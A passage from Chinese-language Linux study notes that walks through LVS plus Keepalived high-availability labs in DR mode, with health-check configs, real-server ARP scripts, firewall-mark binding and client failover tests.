 lb_algo rr|wrr|lc|wlc|lblc|sh|dh #定义调度方法
 lb_kind NAT|DR|TUN  #集群的类型,注意要大写
 persistence_timeout <INT>  #持久连接时长
 protocol TCP|UDP|SCTP  #指定服务协议,一般为TCP
 sorry_server <IPADDR> <PORT>  #所有RS故障时，备用服务器地址
 real_server <IPADDR> <PORT> {          #RS的IP和PORT
 weight <INT>   #RS权重
 notify_up <STRING>|<QUOTED-STRING>  #RS上线通知脚本
 notify_down <STRING>|<QUOTED-STRING> #RS下线通知脚本
 HTTP_GET|SSL_GET|TCP_CHECK|SMTP_CHECK|MISC_CHECK { ... } #定义当前主机健康
状态检测方法
 }
}

#注意:括号必须分行写,两个括号写在行,如: }} 会出错
```

#### 42.5.5 应用层监测

```
#1.概述
应用层检测：HTTP_GET|SSL_GET

HTTP_GET|SSL_GET {
 url {
   path <URL_PATH> #定义要监控的URL
   status_code <INT> #判断上述检测机制为健康状态的响应码，一般为 200
 }
 
 connect_timeout <INTEGER> #客户端请求的超时时长, 相当于haproxy的timeout server
 nb_get_retry <INT> #重试次数
 delay_before_retry <INT> #重试之前的延迟时长
 connect_ip <IP ADDRESS> #向当前RS哪个IP地址发起健康状态检测请求
 connect_port <PORT> #向当前RS的哪个PORT发起健康状态检测请求
 bindto <IP ADDRESS> #向当前RS发出健康状态检测请求时使用的源地址
 bind_port <PORT> #向当前RS发出健康状态检测请求时使用的源端口
}




#2.案例
virtual_server 10.0.0.10 80 {
        delay_loop 3
        lb_algo rr
        lb_kind DR
        protocol TCP
        sorry_server 127.0.0.1 80
        real_server 10.0.0.17 80 {
            weight 1
            HTTP_GET {
                url {
                    path /monitor.html
                    status_code 200
                }
               connect_timeout 1
               nb_get_retry 3
               delay_before_retry 1
            }
        }
        real_server 10.0.0.27 80 {
            weight 1
            HTTP_GET {
                url {
                    path /monitor.html
                    status_code 200
                }
               connect_timeout 1
               nb_get_retry 3
               delay_before_retry 1
            }
        }
}
```

#### 42.5.6 TCP监测

```
#1.概述
传输层检测：TCP_CHECK

TCP_CHECK {
     connect_ip <IP ADDRESS> #向当前RS的哪个IP地址发起健康状态检测请求
     connect_port <PORT> #向当前RS的哪个PORT发起健康状态检测请求
     bindto <IP ADDRESS> #发出健康状态检测请求时使用的源地址
     bind_port <PORT> #发出健康状态检测请求时使用的源端口
     connect_timeout <INTEGER> #客户端请求的超时时长, 等于haproxy的timeout server   
}




#2.案例：
[root@ka1 conf.d]# vim liu2_lvs.conf
virtual_server 10.0.0.20 3306 {
        delay_loop 3
        lb_algo rr
        lb_kind DR
        protocol TCP
        real_server 10.0.0.17 3306 {
            weight 1
            TCP_CHECK {
            connect_timeout 5
            nb_get_retry 3
            delay_before_retry 3
           }
        }

        real_server 10.0.0.27 3306 {
            weight 1
            TCP_CHECK {
            connect_timeout 5
            nb_get_retry 3
            delay_before_retry 3
           }
        }
 }
```

#### 42.5.7 LVS+KeepAlived单主-DR模式环境部署

![1656756192464](linux体系.assets/1656756192464.png)

**10.0.0.8**

```
#ka1+lvs
#1.安装包
[root@ka1 ~]# yum -y install ipvsadm nginx;systemctl enable --now nginx;echo Sorry Server ka1 > /usr/share/nginx/html/index.html




#2.创建监控子配置文件

#2.1实现vrrp地址漂移
[root@ka1 conf.d]# vim liu_vrrp.conf
vrrp_instance liu1 {
    state MASTER
    interface eth0
    virtual_router_id 66
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
     unicast_src_ip 10.0.0.8
     unicast_peer{
     10.0.0.18
   }
     notify_master "/etc/keepalived/notify.sh master"
     notify_backup "/etc/keepalived/notify.sh backup"
     notify_fault "/etc/keepalived/notify.sh fault"
}

#2.2在vrrp的基础上实现高可用
[root@ka1 ~]# cd /etc/keepalived/conf.d/
[root@ka1 conf.d]# vim liu_lvs.conf
virtual_server 10.0.0.10 80 {
        delay_loop 3
        lb_algo rr
        lb_kind DR
        protocol TCP
        sorry_server 127.0.0.1 80
        real_server 10.0.0.17 80 {
            weight 1
            HTTP_GET {
                url {
                    path /monitor.html
                    status_code 200
                }
               connect_timeout 1
               nb_get_retry 3
               delay_before_retry 1
            }
        }
        real_server 10.0.0.27 80 {
            weight 1
            HTTP_GET {
                url {
                    path /monitor.html
                    status_code 200
                }
               connect_timeout 1
               nb_get_retry 3
               delay_before_retry 1
            }
        }
}




#3.启动服务
[root@ka1 conf.d]# systemctl restart keepalived.service 
[root@ka1 conf.d]# ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  10.0.0.10:80 rr
  -> 10.0.0.17:80                 Route   1      0          0         
  -> 10.0.0.27:80                 Route   1      0          0 
```

**10.0.0.18**

```
#ka2+lvs
#1.安装包
root@ka2:~# yum -y install ipvsadm nginx;systemctl enable --now nginx;echo Sorry Server ka2 > /usr/share/nginx/html/index.html






#2.创建监控子配置文件

#2.1实现vrrp地址漂移
[root@ka2 ~]# cd /etc/keepalived/conf.d/
[root@ka2 conf.d]# vim liu_vrrp.conf
vrrp_instance liu1 {
    state MASTER
    interface eth0
    virtual_router_id 66
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
     unicast_src_ip 10.0.0.8
     unicast_peer{
     10.0.0.18
   }
     notify_master "/etc/keepalived/notify.sh master"
     notify_backup "/etc/keepalived/notify.sh backup"
     notify_fault "/etc/keepalived/notify.sh fault"
}

#2.2在vrrp的基础上实现高可用
[root@ka2 conf.d]# vim liu_lvs.conf
virtual_server 10.0.0.10 80 {
        delay_loop 3
        lb_algo rr
        lb_kind DR
        protocol TCP
        sorry_server 127.0.0.1 80
        real_server 10.0.0.17 80 {
            weight 1
            HTTP_GET {
                url {
                    path /monitor.html
                    status_code 200
                }
               connect_timeout 1
               nb_get_retry 3
               delay_before_retry 1
            }
        }
        real_server 10.0.0.27 80 {
            weight 1
            HTTP_GET {
                url {
                    path /monitor.html
                    status_code 200
                }
               connect_timeout 1
               nb_get_retry 3
               delay_before_retry 1
            }
       }
}





#3.启动服务
[root@ka2 conf.d]# systemctl restart keepalived.service 
[root@ka2 conf.d]# ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  10.0.0.10:80 rr
  -> 10.0.0.17:80                 Route   1      0          0         
  -> 10.0.0.27:80                 Route   1      0          0 
```

**10.0.0.7**

```
#Real Server
#1.安装包
[root@rs1 ~]# yum -y install httpd mariadb-server net-tools
[root@rs1 ~]# systemctl enable --now httpd mariadb.service
[root@rs1 ~]# echo this is rs1 server > /var/www/html/index.html




#2.脚本自动化部署rs2
[root@rs1 ~]# vim lvs_dr_rs.sh 
#!/bin/bash
#Author:liusenbiao
#Date:2022-05-13
vip=10.0.0.10
mask='255.255.255.255'
dev=lo:1

case $1 in
start)
    echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore
    echo 1 > /proc/sys/net/ipv4/conf/lo/arp_ignore
    echo 2 > /proc/sys/net/ipv4/conf/all/arp_announce
    echo 2 > /proc/sys/net/ipv4/conf/lo/arp_announce
    ifconfig $dev $vip netmask $mask
    echo "The RS Server is Ready!"
    ;;
stop)
    ifconfig $dev down
    echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore
    echo 0 > /proc/sys/net/ipv4/conf/lo/arp_ignore
    echo 0 > /proc/sys/net/ipv4/conf/all/arp_announce
    echo 0 > /proc/sys/net/ipv4/conf/lo/arp_announce
    echo "The RS Server is Canceled!"
    ;;
*)
    echo "Usage: $(basename $0) start|stop"
    exit 1
    ;;
esac
[root@rs1 ~]# bash lvs_dr_rs.sh start
The RS Server is Ready!




#3.检查VIP
[root@rs1 ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet 10.0.0.10/32 scope global lo:1   #VIP成功！！
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:2a:cc:60 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.27/24 brd 10.0.0.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
       
       
       
       
       
#4.配置监控页面
[root@rs1 ~]# vim /var/www/html/monitor.html
monitor page
```

**10.0.0.17**

```
#Real Server
#1.安装包
[root@rs2 ~]# yum -y install httpd mariadb-server net-tools
[root@rs2 ~]# systemctl enable --now httpd mariadb.service
[root@rs2 ~]# echo this is rs2 server > /var/www/html/index.html





#2.脚本自动化部署rs2
[root@rs2 ~]# vim lvs_dr_rs.sh 
#!/bin/bash
#Author:liusenbiao
#Date:2022-05-13
vip=10.0.0.10
mask='255.255.255.255'
dev=lo:1

case $1 in
start)
    echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore
    echo 1 > /proc/sys/net/ipv4/conf/lo/arp_ignore
    echo 2 > /proc/sys/net/ipv4/conf/all/arp_announce
    echo 2 > /proc/sys/net/ipv4/conf/lo/arp_announce
    ifconfig $dev $vip netmask $mask
    echo "The RS Server is Ready!"
    ;;
stop)
    ifconfig $dev down
    echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore
    echo 0 > /proc/sys/net/ipv4/conf/lo/arp_ignore
    echo 0 > /proc/sys/net/ipv4/conf/all/arp_announce
    echo 0 > /proc/sys/net/ipv4/conf/lo/arp_announce
    echo "The RS Server is Canceled!"
    ;;
*)
    echo "Usage: $(basename $0) start|stop"
    exit 1
    ;;
esac
[root@rs2 ~]# bash lvs_dr_rs.sh start
The RS Server is Ready!




#3.检查VIP
[root@rs2 ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet 10.0.0.10/32 scope global lo:1   #VIP成功！！
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:2a:cc:60 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.27/24 brd 10.0.0.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
       
       
       
       
#4.配置监控页面
[root@rs2 ~]# vim /var/www/html/monitor.html
monitor page
```

**10.0.0.6**

```
#客户端
#1.访问成功，采用轮询策略
[19:18:49 root@centos7 ~]#curl 10.0.0.10
this is rs2 server
[19:20:06 root@centos7 ~]#curl 10.0.0.10
this is rs1 server
[19:20:09 root@centos7 ~]#curl 10.0.0.10




#2.破坏10.0.0.7的监控页面后
#只往好的Real Server上调度

#破坏监控页面
[root@rs1 ~]# chmod 0 /var/www/html/monitor.html
[19:20:15 root@centos7 ~]#curl 10.0.0.10
this is rs2 server
[19:22:48 root@centos7 ~]#curl 10.0.0.10
this is rs2 server
[root@ka1 conf.d]# ipvsadm -Ln
#10.0.0.7规则已经自动删除
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  10.0.0.10:80 rr
  -> 10.0.0.27:80                 Route   1      0          0 





#3.恢复监控页面
[root@rs1 ~]# chmod 644 /var/www/html/monitor.html
#恢复监控页面后

[root@ka1 conf.d]# ipvsadm -Ln
[19:18:49 root@centos7 ~]#curl 10.0.0.10
this is rs2 server
[19:20:06 root@centos7 ~]#curl 10.0.0.10
this is rs1 server


#10.0.0.7规则已经自动恢复
[root@ka1 conf.d]# ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  10.0.0.10:80 rr
  -> 10.0.0.7:80                 Route   1      0          0         
  -> 10.0.0.27:80                 Route   1      0          0 




#4.如果两个rs都挂了
#10.0.0.7上
[root@rs1 ~]# chmod 0 /var/www/html/monitor.html
#10.0.0.17上
[root@rs2 ~]# chmod 0 /var/www/html/monitor.html

#测试结果
[19:35:54 root@centos7 ~]#curl 10.0.0.10
Sorry Server ka1
[19:35:55 root@centos7 ~]# curl 10.0.0.10
Sorry Server ka1
[19:35:55 root@centos7 ~]# curl 10.0.0.10
Sorry Server ka1




#5.如果有一个lvs+keepalived服务器挂了
#ip自动飘到另一台机器上

#10.0.0.8机器挂了
[root@ka1 conf.d]# systemctl stop keepalived.service
[19:35:55 root@centos7 ~]#curl 10.0.0.10
Sorry Server ka2
[20:24:57 root@centos7 ~]#curl 10.0.0.10
Sorry Server ka2
```

#### 42.5.8 LVS+KeepAlived双主-DR模式环境部署

![1656766258571](linux体系.assets/1656771018809.png)

**10.0.0.8**

```
#基于单主实验上继续


#1.增加第二个服务
[root@ka1 ~]# cd /etc/keepalived/conf.d

#1.1 修改liu2_vrrp.conf
[root@ka1 conf.d]# vim liu2.conf
vrrp_instance liu2 {
    state BACKUP
    interface eth0
    virtual_router_id 88
    priority 80
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.20/24 dev eth0 label eht0:2
    }
     unicast_src_ip 10.0.0.8
     unicast_peer{
     10.0.0.18
   }
     notify_master "/etc/keepalived/notify.sh master"
     notify_backup "/etc/keepalived/notify.sh backup"
     notify_fault "/etc/keepalived/notify.sh fault"
}


#1.2 修改liu2_lvs.conf配置文件
#实现mysql高可用
[root@ka1 conf.d]# vim liu2_lvs.conf
virtual_server 10.0.0.20 3306 {
        delay_loop 3
        lb_algo rr
        lb_kind DR
        protocol TCP
        real_server 10.0.0.17 3306 {
            weight 1
            TCP_CHECK {
            connect_timeout 5
            nb_get_retry 3
            delay_before_retry 3
           }
        }

        real_server 10.0.0.27 3306 {
            weight 1
            TCP_CHECK {
            connect_timeout 5
            nb_get_retry 3
            delay_before_retry 3
           }
        }
 }





#2.启动服务
[root@ka1 conf.d]# systemctl restart keepalived.service 
[root@ka1 conf.d]# ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  10.0.0.10:80 rr
  -> 10.0.0.17:80                 Route   1      0          0         
  -> 10.0.0.27:80                 Route   1      0          0         
TCP  10.0.0.20:3306 rr
  -> 10.0.0.17:3306               Route   1      0          0         
  -> 10.0.0.27:3306               Route   1      0          0 
  
[root@ka1 conf.d]# hostname -I
10.0.0.8 10.0.0.10
```

**10.0.0.18**

```
#基于单主实验上继续

#1.增加第二个服务
[root@ka2 ~]# cd /etc/keepalived/conf.d

#1.1 修改liu2_vrrp.conf
[root@ka1 conf.d]# vim liu2.conf
vrrp_instance liu2 {
    state MASTER
    interface eth0
    virtual_router_id 88
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.20/24 dev eth0 label eht0:2
    }
    unicast_src_ip 10.0.0.18
    unicast_peer{
    10.0.0.8
   }
     notify_master "/etc/keepalived/notify.sh master"
     notify_backup "/etc/keepalived/notify.sh backup"
     notify_fault "/etc/keepalived/notify.sh fault"
}


#1.2 修改liu2_lvs.conf配置文件
#实现mysql高可用
[root@ka conf.d]# vim liu2_lvs.conf
virtual_server 10.0.0.20 3306 {
        delay_loop 3
        lb_algo rr
        lb_kind DR
        protocol TCP
        real_server 10.0.0.17 3306 {
            weight 1
            TCP_CHECK {
            connect_timeout 5
            nb_get_retry 3
            delay_before_retry 3
           }
        }

        real_server 10.0.0.27 3306 {
            weight 1
            TCP_CHECK {
            connect_timeout 5
            nb_get_retry 3
            delay_before_retry 3
           }
        }
 }
 
 
 
 
#2.启动服务
root@ka2:~# systemctl restart keepalived.service 
root@ka2:~# ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  10.0.0.10:80 rr
  -> 10.0.0.17:80                 Route   1      0          0         
  -> 10.0.0.27:80                 Route   1      0          0         
TCP  10.0.0.20:3306 rr
  -> 10.0.0.17:3306               Route   1      0          0         
  -> 10.0.0.27:3306               Route   1      0          0 
  
root@ka2:~# hostname -I
10.0.0.18 10.0.0.20
```

**10.0.0.7**

```
#基于单主实验上继续
#Real Server
#1.安装包
[root@rs1 ~]# yum -y install httpd mariadb-server net-tools
[root@rs1 ~]# systemctl enable --now httpd mariadb.service
[root@rs1 ~]# echo this is rs1 server > /var/www/html/index.html




#2.脚本自动化部署rs1
[root@rs1 ~]# bash lvs_dr_rs.sh stop
The RS Server is Canceled!
[root@rs1 ~]# vim lvs_dr_rs.sh 
#!/bin/bash
#Author:liusenbiao
#Date:2022-05-13
vip=10.0.0.10
vip2=10.0.0.20
mask='255.255.255.255'
dev=lo:1
dev2=lo:2

case $1 in
start)
    echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore
    echo 1 > /proc/sys/net/ipv4/conf/lo/arp_ignore
    echo 2 > /proc/sys/net/ipv4/conf/all/arp_announce
    echo 2 > /proc/sys/net/ipv4/conf/lo/arp_announce
    ifconfig $dev $vip netmask $mask
    ifconfig $dev2 $vip2 netmask $mask
    echo "The RS Server is Ready!"
    ;;
stop)
    ifconfig $dev down
    ifconfig $dev2 down
    echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore
    echo 0 > /proc/sys/net/ipv4/conf/lo/arp_ignore
    echo 0 > /proc/sys/net/ipv4/conf/all/arp_announce
    echo 0 > /proc/sys/net/ipv4/conf/lo/arp_announce
    echo "The RS Server is Canceled!"
    ;;
*)
    echo "Usage: $(basename $0) start|stop"
    exit 1
    ;;
esac
[root@rs1 ~]# bash lvs_dr_rs.sh start
The RS Server is Ready!




#3.检查VIP
[root@rs1 ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet 10.0.0.10/32 scope global lo:1 #成功
       valid_lft forever preferred_lft forever
    inet 10.0.0.20/32 scope global lo:2 #成功
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:3b:cb:8e brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.17/24 brd 10.0.0.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft foreverr
       
       
       
       
       
#4.配置监控页面
[root@rs1 ~]# vim /var/www/html/monitor.html
monitor page




#5.mysql服务账号授权
[root@rs1 ~]# mysql -e 'grant all on *.* to test@"10.0.0.%" identified by "123456"'
```

**10.0.0.17**

```
#基于单主实验上继续
#Real Server
#1.安装包
[root@rs2 ~]# yum -y install httpd mariadb-server net-tools
[root@rs2 ~]# systemctl enable --now httpd mariadb.service
[root@rs2 ~]# echo this is rs2 server > /var/www/html/index.html





#2.脚本自动化部署rs2
[root@rs2 ~]# bash lvs_dr_rs.sh stop
The RS Server is Canceled!
[root@rs2 ~]# vim lvs_dr_rs.sh 
#!/bin/bash
#Author:liusenbiao
#Date:2022-05-13
vip=10.0.0.10
vip2=10.0.0.20
mask='255.255.255.255'
dev=lo:1
dev2=lo:2

case $1 in
start)
    echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore
    echo 1 > /proc/sys/net/ipv4/conf/lo/arp_ignore
    echo 2 > /proc/sys/net/ipv4/conf/all/arp_announce
    echo 2 > /proc/sys/net/ipv4/conf/lo/arp_announce
    ifconfig $dev $vip netmask $mask
    ifconfig $dev2 $vip2 netmask $mask
    echo "The RS Server is Ready!"
    ;;
stop)
    ifconfig $dev down
    ifconfig $dev2 down
    echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore
    echo 0 > /proc/sys/net/ipv4/conf/lo/arp_ignore
    echo 0 > /proc/sys/net/ipv4/conf/all/arp_announce
    echo 0 > /proc/sys/net/ipv4/conf/lo/arp_announce
    echo "The RS Server is Canceled!"
    ;;
*)
    echo "Usage: $(basename $0) start|stop"
    exit 1
    ;;
esac
[root@rs2 ~]# bash lvs_dr_rs.sh start
The RS Server is Ready!




#3.检查VIP
[root@rs2 ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet 10.0.0.10/32 scope global lo:1 #成功
       valid_lft forever preferred_lft forever
    inet 10.0.0.20/32 scope global lo:2 #成功
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:3b:cb:8e brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.17/24 brd 10.0.0.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft foreverr
       
       
       
       
       
#4.配置监控页面
[root@rs2 ~]# vim /var/www/html/monitor.html
monitor page




#5.mysql服务账号授权
[root@rs2 ~]# mysql -e 'grant all on *.* to test@"10.0.0.%" identified by "123456"'



#6.配置lvs脚本
[root@rs2 ~]# bash lvs_dr_rs.sh stop
The RS Server is Canceled!
```

**10.0.0.6**

```
#1.访问web服务

#1.1访问httpd:80
[21:45:50 root@centos7 ~]#curl 10.0.0.10
this is rs1 server
[21:45:51 root@centos7 ~]#curl 10.0.0.10
this is rs2 server

#1.2访问数据库:3306
[22:01:43 root@centos7 ~]#mysql -utest -p123456 -h10.0.0.20 -e 'select @@hostname'
+------------+
| @@hostname |
+------------+
| rs2        |
+------------+
[22:01:58 root@centos7 ~]#mysql -utest -p123456 -h10.0.0.20 -e 'select @@hostname'
+------------+
| @@hostname |
+------------+
| rs1        |
+------------+




#2.如果rs2中的mysql挂了
#那么请求全部发到rs1上
[root@rs2 ~]# systemctl stop mariadb
[22:02:07 root@centos7 ~]#mysql -utest -p123456 -h10.0.0.20 -e 'select @@hostname'
+------------+
| @@hostname |
+------------+
| rs1        |
+------------+
[22:04:38 root@centos7 ~]#mysql -utest -p123456 -h10.0.0.20 -e 'select @@hostname'
+------------+
| @@hostname |
+------------+
| rs1        |
+------------+




#3.如果keepalived2挂掉后
vip自动飘到keepalived1上，客户端依旧能正常访问
root@ka2:~# systemctl stop keepalived.service
[22:04:39 root@centos7 ~]#mysql -utest -p123456 -h10.0.0.20 -e 'select @@hostname'
+------------+
| @@hostname |
+------------+
| rs2        |
+------------+
[22:08:23 root@centos7 ~]#mysql -utest -p123456 -h10.0.0.20 -e 'select @@hostname'
+------------+
| @@hostname |
+------------+
| rs1        |
+------------+
```

#### 42.5.9 LVS+KeepAlived单主-DR+FWM多服务绑定一个集群

**10.0.0.8**

```
#1.利用防火墙添标签
#从而把多个服务绑定在一起
[root@ka1 conf.d]# iptables -t mangle -A PREROUTING -d 10.0.0.10 -p tcp -m multiport --dports 80,443 -j MARK --set-mark 6
[root@ka1 conf.d]# iptables -t mangle -vnL
Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 MARK       tcp  --  *      *       0.0.0.0/0            10.0.0.10            multiport dports 80,443 MARK set 0x6
    
    
    
    

#2.修改lvs规则
[root@ka1 conf.d]# cd /etc/keepalived/conf.d/
[root@ka1 conf.d]# mv liu_lvs.conf liu_lvs.conf.bak
[root@ka1 conf.d]# vim liu_lvs_fwm.conf
virtual_server fwmark 6 {
  delay_loop 6
  lb_algo rr
  lb_kind DR
  protocol TCP

  real_server 10.0.0.17 80 {
    weight 1
    TCP_CHECK {
      connect_port    80
      connect_timeout 3
    }
  }

  real_server 10.0.0.27 80{
    weight 1
    TCP_CHECK {
      connect_port    80
      connect_timeout 3
    }
  }
}





#3.启动服务
[root@ka1 conf.d]# systemctl restart keepalived.service 
[root@ka1 conf.d]# systemctl status keepalived.service 
● keepalived.service - LVS and VRRP High Availability Monitor
   Loaded: loaded (/usr/lib/systemd/system/keepalived.service; enabled; v>
   Active: active (running) since Sat 2022-07-02 22:35:29 CST; 11s ago
  Process: 9750 ExecStart=/usr/sbin/keepalived $KEEPALIVED_OPTIONS (code=>
 Main PID: 9753 (keepalived)
    Tasks: 3 (limit: 11174)
   Memory: 3.7M
   CGroup: /system.slice/keepalived.service
           ├─9753 /usr/sbin/keepalived -D -S 6
           ├─9754 /usr/sbin/keepalived -D -S 6
           └─9755 /usr/sbin/keepalived -D -S 6
           
           
          
          
#4.查看防火墙标签规则是否生成
[root@ka1 conf.d]# ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  10.0.0.20:3306 rr
  -> 10.0.0.17:3306               Route   1      0          0         
  -> 10.0.0.27:3306               Route   1      0          0         
FWM  6 rr   #生成！！！
  -> 10.0.0.17:80                 Route   1      0          0         
  -> 10.0.0.27:80                 Route   1      0          0 
```

**10.0.0.18**

```
#1.利用防火墙添标签
#从而把多个服务绑定在一起
root@ka2:~# iptables -t mangle -A PREROUTING -d 10.0.0.10 -p tcp -m multiport --dports 80,443 -j MARK --set-mark 6
root@ka2:~# iptables -t mangle -vnL
Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 MARK       tcp  --  *      *       0.0.0.0/0            10.0.0.10            multiport dports 80,443 MARK set 0x6




#2.修改lvs规则
[root@ka2 conf.d]# cd /etc/keepalived/conf.d/
[root@ka2 conf.d]# mv liu_lvs.conf liu_lvs.conf.bak
[root@ka2 conf.d]# vim liu_lvs_fwm.conf
virtual_server fwmark 6 {
  delay_loop 6
  lb_algo rr
  lb_kind DR
  protocol TCP

  real_server 10.0.0.17 80 {
    weight 1
    TCP_CHECK {
      connect_port    80
      connect_timeout 3
    }
  }

  real_server 10.0.0.27 80{
    weight 1
    TCP_CHECK {
      connect_port    80
      connect_timeout 3
    }
  }
}





#3.启动服务
[root@ka2 conf.d]# systemctl restart keepalived.service 
[root@ka2 conf.d]# systemctl status keepalived.service 
● keepalived.service - LVS and VRRP High Availability Monitor
   Loaded: loaded (/usr/lib/systemd/system/keepalived.service; enabled; v>
   Active: active (running) since Sat 2022-07-02 22:35:29 CST; 11s ago
  Process: 9750 ExecStart=/usr/sbin/keepalived $KEEPALIVED_OPTIONS (code=>
 Main PID: 9753 (keepalived)
    Tasks: 3 (limit: 11174)
   Memory: 3.7M
   CGroup: /system.slice/keepalived.service
           ├─9753 /usr/sbin/keepalived -D -S 6
           ├─9754 /usr/sbin/keepalived -D -S 6
           └─9755 /usr/sbin/keepalived -D -S 6
           
           
           
           

#4.查看防火墙标签规则是否生成
[root@ka2 conf.d]# ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  10.0.0.20:3306 rr
  -> 10.0.0.17:3306               Route   1      0          0         
  -> 10.0.0.27:3306               Route   1      0          0         
FWM  6 rr   #生成！！！
  -> 10.0.0.17:80                 Route   1      0          0         
  -> 10.0.0.27:80                 Route   1      0          0
```

**10.0.0.7**

```
#Real Server1
#1.试图在apache上把http和httpd服务绑定为一个集群
#会打开443端口
[root@rs1 ~]# yum -y install mod_ssl;systemctl restart httpd;
```

**10.0.0.17**

```
#Real Server2
#1.试图在apache上把http和httpd服务绑定为一个集群
#会打开443端口
[root@rs2 ~]# yum -y install mod_ssl;systemctl restart httpd;
```

**10.0.0.6**

```
#客户端
#查看标签绑定是否成功
[22:48:47 root@centos7 ~]#curl -k https://10.0.0.10; curl -k http://10.0.0.10
#成功！！！！
this is rs2 server
this is rs1 server
```

### 42.6 VRRP Script

#### 42.6.1VRRP Script配置

```
#1.概述
keepalived利用 VRRP Script 技术，可以调用外部的辅助脚本进行资源监控，并根据监控的结果实现优先动态调整，从而实现其它应用的高可用性功能

参考配置文件：
/usr/share/doc/keepalived/keepalived.conf.vrrp.localcheck






#2.VRRP Script配置
分两步实现：

#2.1定义脚本
vrrp_script：自定义资源监控脚本，vrrp实例根据脚本返回值，公共定义，可被多个实例调用，定义在vrrp实例之外的独立配置块，一般放在global_defs设置块之后。
通常此脚本用于监控指定应用的状态。一旦发现应用的状态异常，则触发对MASTER节点的权重减至低于SLAVE节点，从而实现 VIP 切换到 SLAVE 节点
vrrp_script <SCRIPT_NAME> {
 script <STRING>|<QUOTED-STRING>   #此脚本返回值为非0时，会触发下面OPTIONS执行
 OPTIONS 
}

#2.2调用脚本
track_script：调用vrrp_script定义的脚本去监控资源，定义在VRRP实例之内，调用事先定义的vrrp_script

track_script {
  SCRIPT_NAME_1
  SCRIPT_NAME_2
}





#3.定义VRRP script
